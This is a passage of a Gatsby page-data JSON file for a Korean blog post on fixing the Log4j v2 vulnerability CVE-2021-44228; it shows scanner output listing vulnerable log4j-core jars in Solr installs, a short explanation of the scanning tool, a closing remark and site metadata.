D:"},{"type":"element","tagName":"span","properties":{"className":["token","punctuation"]},"children":[{"type":"text","value":"\\"}]},{"type":"text","value":"tmp"},{"type":"element","tagName":"span","properties":{"className":["token","punctuation"]},"children":[{"type":"text","value":"\\"}]},{"type":"text","value":"solr-7.7.3"},{"type":"element","tagName":"span","properties":{"className":["token","punctuation"]},"children":[{"type":"text","value":"\\"}]},{"type":"text","value":"solr-7.7.3"},{"type":"element","tagName":"span","properties":{"className":["token","punctuation"]},"children":[{"type":"text","value":"\\"}]},{"type":"text","value":"contrib"},{"type":"element","tagName":"span","properties":{"className":["token","punctuation"]},"children":[{"type":"text","value":"\\"}]},{"type":"text","value":"prometheus-exporter"},{"type":"element","tagName":"span","properties":{"className":["token","punctuation"]},"children":[{"type":"text","value":"\\"}]},{"type":"text","value":"lib"},{"type":"element","tagName":"span","properties":{"className":["token","punctuation"]},"children":[{"type":"text","value":"\\"}]},{"type":"text","value":"log4j-core-2.11.0.jar, log4j "},{"type":"element","tagName":"span","properties":{"className":["token","number"]},"children":[{"type":"text","value":"2.11"}]},{"type":"text","value":".0\n"},{"type":"element","tagName":"span","properties":{"className":["token","punctuation"]},"children":[{"type":"text","value":"["}]},{"type":"text","value":"*"},{"type":"element","tagName":"span","properties":{"className":["token","punctuation"]},"children":[{"type":"text","value":"]"}]},{"type":"text","value":" Found CVE-2021-44228 vulnerability "},{"type":"element","tagName":"span","properties":{"className":["token","keyword"]},"children":[{"type":"text","value":"in"}]},{"type":"text","value":" D:"},{"type":"element","tagName":"span","properties":{"className":["token","punctuation"]},"children":[{"type":"text","value":"\\"}]},{"type":"text","value":"tmp"},{"type":"element","tagName":"span","properties":{"className":["token","punctuation"]},"children":[{"type":"text","value":"\\"}]},{"type":"text","value":"solr-7.7.3"},{"type":"element","tagName":"span","properties":{"className":["token","punctuation"]},"children":[{"type":"text","value":"\\"}]},{"type":"text","value":"solr-7.7.3"},{"type":"element","tagName":"span","properties":{"className":["token","punctuation"]},"children":[{"type":"text","value":"\\"}]},{"type":"text","value":"server"},{"type":"element","tagName":"span","properties":{"className":["token","punctuation"]},"children":[{"type":"text","value":"\\"}]},{"type":"text","value":"lib"},{"type":"element","tagName":"span","properties":{"className":["token","punctuation"]},"children":[{"type":"text","value":"\\"}]},{"type":"text","value":"ext"},{"type":"element","tagName":"span","properties":{"className":["token","punctuation"]},"children":[{"type":"text","value":"\\"}]},{"type":"text","value":"log4j-core-2.11.0.jar, log4j "},{"type":"element","tagName":"span","properties":{"className":["token","number"]},"children":[{"type":"text","value":"2.11"}]},{"type":"text","value":".0\n"},{"type":"element","tagName":"span","properties":{"className":["token","punctuation"]},"children":[{"type":"text","value":"["}]},{"type":"text","value":"*"},{"type":"element","tagName":"span","properties":{"className":["token","punctuation"]},"children":[{"type":"text","value":"]"}]},{"type":"text","value":" Found CVE-2021-44228 vulnerability "},{"type":"element","tagName":"span","properties":{"className":["token","keyword"]},"children":[{"type":"text","value":"in"}]},{"type":"text","value":" D:"},{"type":"element","tagName":"span","properties":{"className":["token","punctuation"]},"children":[{"type":"text","value":"\\"}]},{"type":"text","value":"tmp"},{"type":"element","tagName":"span","properties":{"className":["token","punctuation"]},"children":[{"type":"text","value":"\\"}]},{"type":"text","value":"solr-8.11.0"},{"type":"element","tagName":"span","properties":{"className":["token","punctuation"]},"children":[{"type":"text","value":"\\"}]},{"type":"text","value":"contrib"},{"type":"element","tagName":"span","properties":{"className":["token","punctuation"]},"children":[{"type":"text","value":"\\"}]},{"type":"text","value":"prometheus-exporter"},{"type":"element","tagName":"span","properties":{"className":["token","punctuation"]},"children":[{"type":"text","value":"\\"}]},{"type":"text","value":"lib"},{"type":"element","tagName":"span","properties":{"className":["token","punctuation"]},"children":[{"type":"text","value":"\\"}]},{"type":"text","value":"log4j-core-2.14.1.jar, log4j "},{"type":"element","tagName":"span","properties":{"className":["token","number"]},"children":[{"type":"text","value":"2.14"}]},{"type":"text","value":".1\n"},{"type":"element","tagName":"span","properties":{"className":["token","punctuation"]},"children":[{"type":"text","value":"["}]},{"type":"text","value":"*"},{"type":"element","tagName":"span","properties":{"className":["token","punctuation"]},"children":[{"type":"text","value":"]"}]},{"type":"text","value":" Found CVE-2021-44228 vulnerability "},{"type":"element","tagName":"span","properties":{"className":["token","keyword"]},"children":[{"type":"text","value":"in"}]},{"type":"text","value":" D:"},{"type":"element","tagName":"span","properties":{"className":["token","punctuation"]},"children":[{"type":"text","value":"\\"}]},{"type":"text","value":"tmp"},{"type":"element","tagName":"span","properties":{"className":["token","punctuation"]},"children":[{"type":"text","value":"\\"}]},{"type":"text","value":"solr-8.11.0"},{"type":"element","tagName":"span","properties":{"className":["token","punctuation"]},"children":[{"type":"text","value":"\\"}]},{"type":"text","value":"server"},{"type":"element","tagName":"span","properties":{"className":["token","punctuation"]},"children":[{"type":"text","value":"\\"}]},{"type":"text","value":"lib"},{"type":"element","tagName":"span","properties":{"className":["token","punctuation"]},"children":[{"type":"text","value":"\\"}]},{"type":"text","value":"ext"},{"type":"element","tagName":"span","properties":{"className":["token","punctuation"]},"children":[{"type":"text","value":"\\"}]},{"type":"text","value":"log4j-core-2.14.1.jar, log4j "},{"type":"element","tagName":"span","properties":{"className":["token","number"]},"children":[{"type":"text","value":"2.14"}]},{"type":"text","value":".1\n\nScanned "},{"type":"element","tagName":"span","properties":{"className":["token","number"]},"children":[{"type":"text","value":"5047"}]},{"type":"text","value":" directories and "},{"type":"element","tagName":"span","properties":{"className":["token","number"]},"children":[{"type":"text","value":"26251"}]},{"type":"text","value":" files\nFound "},{"type":"element","tagName":"span","properties":{"className":["token","number"]},"children":[{"type":"text","value":"9"}]},{"type":"text","value":" vulnerable files\nCompleted "},{"type":"element","tagName":"span","properties":{"className":["token","keyword"]},"children":[{"type":"text","value":"in"}]},{"type":"text","value":" "},{"type":"element","tagName":"span","properties":{"className":["token","number"]},"children":[{"type":"text","value":"0.42"}]},{"type":"text","value":" seconds"}]}]}]},{"type":"text","value":"\n"},{"type":"element","tagName":"p","properties":{},"children":[{"type":"text","value":"위 툴은 제공된 경로의 모든 하위경로의 "},{"type":"element","tagName":"strong","properties":{},"children":[{"type":"text","value":".jar"}]},{"type":"text","value":" 파일을 찾고, 취약한 Log4j 버전이 사용되는지 확인해서 출력하는 방식이라고 합니다."}]},{"type":"text","value":"\n"},{"type":"element","tagName":"h1","properties":{},"children":[{"type":"text","value":"줄이며…"}]},{"type":"text","value":"\n"},{"type":"element","tagName":"p","properties":{},"children":[{"type":"text","value":"지금까지 Log4j v2의 취약점 해결 방법에 대해 알아보았습니다."},{"type":"element","tagName":"br","properties":{},"children":[]},{"type":"text","value":"\n많은 프로젝트에서 사용하는 라이브러리에 크리티컬한 취약점 발생시, 그 여파가 얼마나 큰지 느낄 수 있는 경험이었습니다."}]}],"data":{"quirksMode":false}},"excerpt":"개요 이 포스팅에서는 Apache의 Log4j v2 라이브러리의 취약점 CVE-2021-44228 해결 방법에 대해 알아보겠습니다. 요약 이번 취약점은 Log4j의 v2에만 해당되며, 해당되는 세부 버전은 <=2.14.…","timeToRead":4,"frontmatter":{"template":"post","title":"Apache Log4j v2 취약점 [CVE-2021-44228]","userDate":"12 December 2021","date":"2021-12-12T07:16:22.000Z","tags":["vulnerability","apache","log4j","log4j2"],"excerpt":"Apache Log4j v2 취약점 취약점 및 해결방법에 대해 알아봅니다.","image":{"childImageSharp":{"gatsbyImageData":{"layout":"constrained","backgroundColor":"#080808","images":{"fallback":{"src":"/static/a5e40fa52ecec9ca0ecc0a73fd2d9c6d/86738/cover.jpg","srcSet":"/static/a5e40fa52ecec9ca0ecc0a73fd2d9c6d/79dfe/cover.jpg 360w,\n/static/a5e40fa52ecec9ca0ecc0a73fd2d9c6d/be09f/cover.jpg 720w,\n/static/a5e40fa52ecec9ca0ecc0a73fd2d9c6d/86738/cover.jpg 1440w","sizes":"(min-width: 1440px) 1440px, 100vw"},"sources":[{"srcSet":"/static/a5e40fa52ecec9ca0ecc0a73fd2d9c6d/46060/cover.webp 360w,\n/static/a5e40fa52ecec9ca0ecc0a73fd2d9c6d/c7e6a/cover.webp 720w,\n/static/a5e40fa52ecec9ca0ecc0a73fd2d9c6d/f94ff/cover.webp 1440w","type":"image/webp","sizes":"(min-width: 1440px) 1440px, 100vw"}]},"width":1440,"height":1000}}}}},"relatedPosts":{"totalCount":1,"edges":[{"node":{"id":"135468ce-ecfa-563d-aa1e-74ab46118402","timeToRead":4,"excerpt":"개요 이 포스팅에서는 Apache의 Log4j v2 라이브러리의 취약점 CVE-2021-44228 해결 방법에 대해 알아보겠습니다. 요약 이번 취약점은 Log4j의 v2에만 해당되며, 해당되는 세부 버전은 <=2.14.…","frontmatter":{"title":"Apache Log4j v2 취약점 [CVE-2021-44228]","date":"2021-12-12T07:16:22.000Z"},"fields":{"slug":"/development/etc/vulnerability-apache-log4j-v2"}}}]}},"pageContext":{"slug":"/development/etc/vulnerability-apache-log4j-v2","prev":{"excerpt":"개요 이 포스팅에서는 Spring Bean을 등록하는 여러 가지 방법에 대해 알아봅니다. Spring Bean 등록 방법 Spring Bean을 설정하는 방법에는 크게 XML 설정을 통한 방법과 Java…","timeToRead":3,"frontmatter":{"template":"post","title":"Spring Bean 등록하는 여러 가지 방법","tags":["spring_framework","spring_bean","bean"],"date":"2021-07-10T06:57:59.000Z","draft":false,"excerpt":"Spring Bean을 XML 및 Java로 등록하는 방법과 컴포넌트 스캔을 활용하는 법에 대해 알아봅니다.","image":{"childImageSharp":{"gatsbyImageData":{"layout":"constrained","backgroundColor":"#68b838","images":{"fallback":{"src":"/static/01d44fb486822261054e340f45003a56/7f99f/cover.jpg","srcSet":"/static/01d44fb486822261054e340f45003a56/3b635/cover.jpg 360w,\n/static/01d44fb486822261054e340f45003a56/9007f/cover.jpg 720w,\n/static/01d44fb486822261054e340f45003a56/7f99f/cover.jpg 1440w","sizes":"(min-width: 1440px) 1440px, 100vw"},"sources":[{"srcSet":"/static/01d44fb486822261054e340f45003a56/25350/cover.webp 360w,\n/static/01d44fb486822261054e340f45003a56/110ca/cover.webp 720w,\n/static/01d44fb486822261054e340f45003a56/8ff83/cover.webp 1440w","type":"image/webp","sizes":"(min-width: 1440px) 1440px, 100vw"}]},"width":1440,"height":810}}}},"fields":{"category":"development","slug":"/development/back-end/spring-framework/create-spring-bean"}},"next":null,"primaryTag":"vulnerability"}},
    "staticQueryHashes": ["1144773313","288898337"]}